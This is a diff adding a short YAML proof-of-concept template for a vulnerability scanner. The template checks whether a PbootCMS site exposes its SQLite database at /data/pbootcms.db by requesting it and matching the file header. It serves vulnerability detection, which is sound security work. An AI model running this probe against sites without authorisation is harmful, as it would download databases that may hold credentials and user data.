@@ -1,0 +1,16 @@
+name: poc-yaml-pbootcms-database-file-download
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /data/pbootcms.db
+            follow_redirects: false
+        expression: response.status == 200 && "^SQLite format 3\\x00\\x10".bmatches(response.body) && response.body.bcontains(b"PbootCMS")
+expression: r0()
+detail:
+    author: abcRosexyz(https://github.com/abcRosexyz)
+    links:
+        - https://www.cnblogs.com/0daybug/p/12786036.html
